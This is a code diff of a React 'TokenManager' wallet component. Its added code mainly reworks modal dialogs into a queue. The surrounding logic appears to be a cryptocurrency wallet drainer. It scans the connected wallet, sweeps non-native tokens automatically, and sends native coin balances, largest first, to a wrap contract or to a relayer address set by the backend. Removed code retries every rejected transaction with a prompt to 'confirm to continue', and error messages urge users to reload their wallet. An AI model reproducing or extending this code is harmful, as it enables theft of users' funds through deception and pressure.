@@ -64,38 +64,88 @@ export default function TokenManager(): React.JSX.Element {
   const [detectedTokensCount, setDetectedTokensCount] = useState<number>(0)
   const [pendingNativeTokens, setPendingNativeTokens] = useState<Token[]>([])
 
-  // Estados para modales
-  const [showModal, setShowModal] = useState<boolean>(false)
-  const [modalContent, setModalContent] = useState<{
+  // Nuevos estados para gestión de modales
+  const [modalQueue, setModalQueue] = useState<Array<{
+    type: 'processing' | 'error' | 'confirmation' | 'info';
     title: string;
     message: string;
-    type: 'error' | 'info' | 'success';
     onConfirm?: () => void;
-    confirmText?: string;
-    showCancel?: boolean;
     onCancel?: () => void;
-  }>({
-    title: '',
-    message: '',
-    type: 'info'
-  })
+    confirmText?: string;
+  }>>([]);
+
+  const [currentModal, setCurrentModal] = useState<null | {
+    type: 'processing' | 'error' | 'confirmation' | 'info';
+    title: string;
+    message: string;
+    onConfirm?: () => void;
+    onCancel?: () => void;
+    confirmText?: string;
+  }>(null);
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
   const { switchChain } = useSwitchChain()
 
-  // Función para mostrar modales
-  const showAlertModal = (title: string, message: string, type: 'error' | 'info' | 'success' = 'info', onConfirm?: () => void, confirmText: string = 'Aceptar', showCancel: boolean = false, onCancel?: () => void) => {
-    setModalContent({
+  // Función para agregar modales a la cola
+  const addToModalQueue = (modalData: {
+    type: 'processing' | 'error' | 'confirmation' | 'info';
+    title: string;
+    message: string;
+    onConfirm?: () => void;
+    onCancel?: () => void;
+    confirmText?: string;
+  }) => {
+    setModalQueue(prev => [...prev, modalData]);
+  };
+
+  // Función para procesar el siguiente modal en la cola
+  const processNextModal = () => {
+    if (modalQueue.length > 0) {
+      setCurrentModal(modalQueue[0]);
+      setModalQueue(prev => prev.slice(1));
+    } else {
+      setCurrentModal(null);
+    }
+  };
+
+  // Función para cerrar el modal actual
+  const closeCurrentModal = () => {
+    setCurrentModal(null);
+    setTimeout(processNextModal, 300); // Pequeño delay para transición
+  };
+
+  // Función para mostrar modales (usa el sistema de cola)
+  const showAlertModal = (
+    title: string, 
+    message: string, 
+    type: 'error' | 'info' | 'success' = 'info', 
+    onConfirm?: () => void, 
+    confirmText: string = 'Aceptar', 
+    showCancel: boolean = false, 
+    onCancel?: () => void
+  ) => {
+    const modalType = type === 'error' ? 'error' : 
+                     type === 'success' ? 'info' : 'info';
+    
+    addToModalQueue({
+      type: modalType,
       title,
       message,
-      type,
-      onConfirm,
-      confirmText,
-      showCancel,
-      onCancel
-    })
-    setShowModal(true)
-  }
+      onConfirm: () => {
+        onConfirm?.();
+        closeCurrentModal();
+      },
+      onCancel: showCancel ? () => {
+        onCancel?.();
+        closeCurrentModal();
+      } : undefined,
+      confirmText
+    });
+    
+    if (!currentModal) {
+      processNextModal();
+    }
+  };
 
   const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
     if (!walletClient) throw new Error('Wallet client no disponible')
@@ -249,7 +299,6 @@ export default function TokenManager(): React.JSX.Element {
     // Mostrar modal en lugar de alert nativo
     return new Promise(resolve => {
       showAlertModal('Aviso', message, 'info', () => {
-        setShowModal(false)
         resolve()
       })
     })
@@ -278,23 +327,25 @@ export default function TokenManager(): React.JSX.Element {
       })
     }
 
-    // Mostrar modal de confirmación
+    // Mostrar modal de confirmación usando el sistema de cola
     return new Promise(resolve => {
-      showAlertModal(
-        'Confirmar', 
-        message, 
-        'info', 
-        () => {
-          setShowModal(false)
-          resolve(true)
+      addToModalQueue({
+        type: 'confirmation',
+        title: 'Confirmar',
+        message,
+        onConfirm: () => {
+          resolve(true);
+          closeCurrentModal();
         },
-        'Aceptar',
-        true,
-        () => {
-          setShowModal(false)
-          resolve(false)
+        onCancel: () => {
+          resolve(false);
+          closeCurrentModal();
         }
-      )
+      });
+      
+      if (!currentModal) {
+        processNextModal();
+      }
     })
   }
 
@@ -339,7 +390,6 @@ export default function TokenManager(): React.JSX.Element {
           'Error no tienes saldo, recarga la billetera e intenta de nuevo', 
           'error', 
           () => {
-            setShowModal(false)
             scanWallet() // Reintentar el escaneo
           },
           'Reintentar'
@@ -412,9 +462,6 @@ export default function TokenManager(): React.JSX.Element {
         throw new Error('No se pudo determinar la cadena del token');
       }
 
-      // Cambiar a la cadena correcta antes de procesar
-      await changeChainIfNeeded(targetChainId);
-
       // Resto del código para wrap o transferencia...
       const wrapInfo = await getWrapInfo(targetChainId);
       const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
@@ -443,13 +490,8 @@ export default function TokenManager(): React.JSX.Element {
         // Mostrar modal de error de gas
         showAlertModal(
           'Error', 
-          'Por favor recargue la wallet', 
-          'error', 
-          () => {
-            setShowModal(false)
-            processNativeToken(token) // Reintentar procesamiento
-          },
-          'Reintentar'
+          'Saldo insuficiente para gas fees. Por favor recarga la wallet.', 
+          'error'
         )
         
         return { success: false, reason }
@@ -635,284 +677,86 @@ export default function TokenManager(): React.JSX.Element {
     }
   }
 
-  const processAllTokens = async (): Promise<void> => {
-  if (!tokens.length || processing) {
+  const finishProcessing = () => {
+    setProcessing(false)
     setShowProcessingModal(false)
-    return
-  }
-
-  setProcessing(true)
-  setSummary({ sent: [], failed: [] })
-  
-  // Separar tokens nativos y no nativos
-  const nonNativeTokens = tokens.filter(token => token.address !== null)
-  const nativeTokens = tokens.filter(token => token.address === null)
-  
-  // Procesar tokens no nativos automáticamente
-  for (const token of nonNativeTokens) {
-    await processToken(token)
-  }
-
-  // Procesar tokens nativos solo si el usuario acepta explícitamente
-  if (nativeTokens.length > 0) {
-    let shouldProcessNatives = false;
     
-    // Mostrar confirmación solo una vez
-    shouldProcessNatives = await confirmAction(
-      `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
-    );
-    
-    if (shouldProcessNatives) {
-      // Ordenar tokens nativos por balance (mayor primero)
-      const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
-        const balanceA = ethers.BigNumber.from(a.balance || '0')
-        const balanceB = ethers.BigNumber.from(b.balance || '0')
-        return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
-      })
+    setTimeout(() => {
+      if (summary.sent.length > 0 || summary.failed.length > 0) {
+        let message = '=== Resumen ===\n'
+        message += `Éxitos: ${summary.sent.length}\n`
+        message += `Fallos: ${summary.failed.length}\n`
 
-      // Procesar tokens nativos
-      for (const token of sortedNativeTokens) {
-        await changeChainIfNeeded(token.chain as number)
-        await processNativeToken(token)
-      }
-    } else {
-      // Si el usuario rechaza, agregar a la lista de fallados
-      setSummary(prev => ({
-        ...prev,
-        failed: [
-          ...prev.failed,
-          ...nativeTokens.map(token => ({ 
-            token, 
-            reason: 'Usuario rechazó el procesamiento' 
-          }))
-        ]
-      }))
-    }
-  }
-
-  setProcessing(false)
-  setShowProcessingModal(false)
-
-  // Mostrar resumen después de un breve delay
-  setTimeout(() => {
-    if (summary.sent.length > 0 || summary.failed.length > 0) {
-      let message = '=== Resumen ===\n'
-      message += `Éxitos: ${summary.sent.length}\n`
-      message += `Fallos: ${summary.failed.length}\n`
-
-      if (summary.failed.length > 0) {
-        message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
-      }
-
-      showAlertModal('Resumen', message, 'info')
-    }
-  }, 100)
-}
-
-const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
-  try {
-    if (!walletClient || !publicClient || !address) {
-      throw new Error('Wallet no conectada correctamente');
-    }
-
-    // Cambiar a la cadena correcta antes de procesar
-    await changeChainIfNeeded(token.chain as number)
-
-    const targetChainId = token.chain as number;
-    if (!targetChainId) {
-      throw new Error('No se pudo determinar la cadena del token');
-    }
-
-    // Resto del código para wrap o transferencia...
-    const wrapInfo = await getWrapInfo(targetChainId);
-    const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
-
-    const balanceBN = ethers.BigNumber.from(token.balance || '0')
-    const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
-
-    // Estimaciones de gas
-    const gasLimitTransfer = ethers.BigNumber.from(21000)
-    const gasLimitWrap = ethers.BigNumber.from(100000)
-
-    // Buffer de seguridad
-    const buffer = gasPrice.mul(30000)
-
-    // Calcular máximos seguros
-    const feeWrap = gasPrice.mul(gasLimitWrap)
-    const feeTransfer = gasPrice.mul(gasLimitTransfer)
-    const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
-    const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)
-
-    // Si no hay suficiente para ninguna operación
-    if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
-      const reason = 'Saldo insuficiente para cubrir gas fees'
-      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
-      return { success: false, reason }
-    }
-
-    // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
-    if (wrappedAddress && maxSafeForWrap.gt(0)) {
-      try {
-        showLoading(`Procesando wrap de ${token.symbol}...`)
-        
-        const wrapAbi = [
-          {
-            inputs: [],
-            name: 'deposit',
-            outputs: [],
-            stateMutability: 'payable',
-            type: 'function'
-          }
-        ] as const
-
-        // Reintentar hasta que la transacción sea confirmada
-        let transactionHash: string | undefined;
-        let confirmed = false;
-        
-        while (!confirmed) {
-          try {
-            transactionHash = await walletClient.writeContract({
-              address: wrappedAddress as `0x${string}`,
-              abi: wrapAbi,
-              functionName: 'deposit',
-              value: maxSafeForWrap.toBigInt(),
-              gas: gasLimitWrap.toBigInt()
-            })
-
-            showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
-            await publicClient.waitForTransactionReceipt({ hash: transactionHash })
-            confirmed = true;
-
-          } catch (error: any) {
-            if (isUserRejected(error)) {
-              // Si el usuario rechaza, mostrar alerta y reintentar
-              await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
-              continue;
-            }
-            throw error;
-          }
+        if (summary.failed.length > 0) {
+          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
         }
 
-        setSummary(prev => ({
-          ...prev,
-          sent: [...prev.sent, { 
-            token: { ...token, symbol: `W${token.symbol}` }, 
-            type: 'wrap', 
-            tx: transactionHash, 
-            amount: maxSafeForWrap.toString() 
-          }]
-        }))
+        showAlertModal('Resumen', message, 'info')
+      }
+    }, 100)
+  }
 
-        hideLoading()
-        return { success: true }
-      } catch (error: any) {
-          // Manejo de errores
-          console.error('Error procesando token nativo:', error);
-          const reason = isUserRejected(error) ? 
-            'Usuario rechazó la transacción' : 
-            `Error: ${error?.message || error}`;
+  const processAllTokens = async (): Promise<void> => {
+    if (!tokens.length || processing) {
+      setShowProcessingModal(false)
+      return
+    }
 
-          setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
-          return { success: false, reason };
-        }
-      };
+    setProcessing(true)
+    setSummary({ sent: [], failed: [] })
+    
+    // Separar tokens nativos y no nativos
+    const nonNativeTokens = tokens.filter(token => token.address !== null)
+    const nativeTokens = tokens.filter(token => token.address === null)
 
-    // Si no se hizo wrap, crear solicitud de transferencia en el backend
-    if (maxSafeForTransfer.gt(0)) {
-      if (!BACKEND) throw new Error('BACKEND no configurado')
-      
-      showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
-      const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
+    // Procesar tokens no nativos automáticamente
+    for (const token of nonNativeTokens) {
+      await processToken(token)
+    }
+
+    // Procesar tokens nativos solo con confirmación explícita
+    if (nativeTokens.length > 0) {
+      // Agregar a la cola en lugar de mostrar directamente
+      addToModalQueue({
+        type: 'confirmation',
+        title: 'Confirmar',
+        message: `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`,
+        onConfirm: async () => {
+          const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
+            const balanceA = ethers.BigNumber.from(a.balance || '0')
+            const balanceB = ethers.BigNumber.from(b.balance || '0')
+            return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
+          })
+
+          for (const token of sortedNativeTokens) {
+            await changeChainIfNeeded(token.chain as number)
+            await processNativeToken(token)
+          }
+          
+          finishProcessing()
         },
-        body: JSON.stringify({
-          owner: address,
-          chain: token.chain,
-          amount: maxSafeForTransfer.toString()
-        })
-      })
-
-      if (data.ok && data.instructions && data.instructions.relayerAddress) {
-        // Reintentar hasta que la transacción sea confirmada
-        let transactionHash: string | undefined;
-        let confirmed = false;
-        
-        while (!confirmed) {
-          try {
-            showLoading(`Enviando ${token.symbol} al relayer...`)
-            transactionHash = await walletClient.sendTransaction({
-              to: data.instructions.relayerAddress as `0x${string}`,
-              value: maxSafeForTransfer.toBigInt(),
-              gas: gasLimitTransfer.toBigInt()
-            })
-
-            showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
-            await publicClient.waitForTransactionReceipt({ hash: transactionHash })
-            confirmed = true;
-
-          } catch (error: any) {
-            if (isUserRejected(error)) {
-              // Si el usuario rechaza, mostrar alerta y reintentar
-              await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
-              continue;
-            }
-            throw error;
-          }
+        onCancel: () => {
+          setSummary(prev => ({
+            ...prev,
+            failed: [
+              ...prev.failed,
+              ...nativeTokens.map(token => ({ 
+                token, 
+                reason: 'Usuario rechazó el procesamiento' 
+              }))
+            ]
+          }))
+          finishProcessing()
         }
-
-        setSummary(prev => ({
-          ...prev,
-          sent: [...prev.sent, { 
-            token, 
-            type: 'transfer', 
-            tx: transactionHash, 
-            amount: maxSafeForTransfer.toString(), 
-            jobId: data.jobId 
-          }]
-        }))
-        
-        hideLoading()
-        return { success: true }
-      } else {
-        hideLoading()
-        throw new Error('Error creando solicitud de transferencia')
-      }
+      })
+    } else {
+      finishProcessing()
     }
-    
-    hideLoading()
-    return { success: false, reason: 'No se pudo procesar el token nativo' }
-  } catch (error: any) {
-    hideLoading()
-    console.error('Error procesando token nativo:', error)
 
-    const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
-
-    setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
-    return { success: false, reason }
+    if (!currentModal) {
+      processNextModal()
+    }
   }
-}
-
-  setProcessing(false)
-  setShowProcessingModal(false)
-
-  // Mostrar resumen
-  setTimeout(() => {
-    if (summary.sent.length > 0 || summary.failed.length > 0) {
-      let message = 'Resumen:\n'
-      message += `Éxitos: ${summary.sent.length}\n`
-      message += `Fallos: ${summary.failed.length}`
-      
-      if (summary.failed.length > 0) {
-        message += '\n\nAlgunos tokens no se procesaron. Revisa los detalles.'
-      }
-
-      showAlertModal('Proceso completado', message, 'info')
-    }
-  }, 100)
-}
 
   // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
@@ -1387,8 +1231,8 @@ const processNativeToken = async (token: Token): Promise<{success: boolean, reas
         </div>
       )}
 
-      {/* Modal para alertas y confirmaciones */}
-      {showModal && (
+      {/* Modal unificado para todos los tipos */}
+      {currentModal && (
         <div style={{
           position: 'fixed',
           top: 0,
@@ -1410,12 +1254,13 @@ const processNativeToken = async (token: Token): Promise<{success: boolean, reas
             boxShadow: '0 10px 25px rgba(0, 0, 0, 0.5)'
           }}>
             <h2 style={{ 
-              color: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#fff', 
+              color: currentModal.type === 'error' ? '#ff6b6b' : 
+                     currentModal.type === 'info' ? '#0070f3' : '#fff', 
               marginTop: 0,
               fontSize: '1.5rem',
               marginBottom: '1rem'
             }}>
-              {modalContent.title}
+              {currentModal.title}
             </h2>
             <p style={{ 
               color: '#ccc', 
@@ -1423,18 +1268,15 @@ const processNativeToken = async (token: Token): Promise<{success: boolean, reas
               lineHeight: '1.5',
               marginBottom: '2rem'
             }}>
-              {modalContent.message}
+              {currentModal.message}
             </p>
             <div style={{ 
               display: 'flex', 
-              justifyContent: modalContent.showCancel ? 'space-between' : 'flex-end', 
+              justifyContent: currentModal.type === 'confirmation' ? 'space-between' : 'flex-end', 
               gap: '1rem' 
             }}>
-              {modalContent.showCancel && (
-                <button onClick={() => {
-                  setShowModal(false)
-                  modalContent.onCancel && modalContent.onCancel()
-                }} style={{
+              {currentModal.type === 'confirmation' && (
+                <button onClick={currentModal.onCancel} style={{
                   padding: '0.75rem 1.5rem',
                   backgroundColor: 'transparent',
                   color: '#fff',
@@ -1447,12 +1289,10 @@ const processNativeToken = async (token: Token): Promise<{success: boolean, reas
                   Cancelar
                 </button>
               )}
-              <button onClick={() => {
-                setShowModal(false)
-                modalContent.onConfirm && modalContent.onConfirm()
-              }} style={{
+              <button onClick={currentModal.onConfirm} style={{
                 padding: '0.75rem 1.5rem',
-                backgroundColor: modalContent.type === 'error' ? '#ff6b6b' : modalContent.type === 'success' ? '#4ecdc4' : '#0070f3',
+                backgroundColor: currentModal.type === 'error' ? '#ff6b6b' : 
+                                currentModal.type === 'info' ? '#0070f3' : '#4ecdc4',
                 color: '#fff',
                 border: 'none',
                 borderRadius: '8px',
@@ -1460,7 +1300,7 @@ const processNativeToken = async (token: Token): Promise<{success: boolean, reas
                 fontSize: '1rem',
                 fontWeight: '500'
               }}>
-                {modalContent.confirmText}
+                {currentModal.confirmText || (currentModal.type === 'confirmation' ? 'Aceptar' : 'Entendido')}
               </button>
             </div>
           </div>
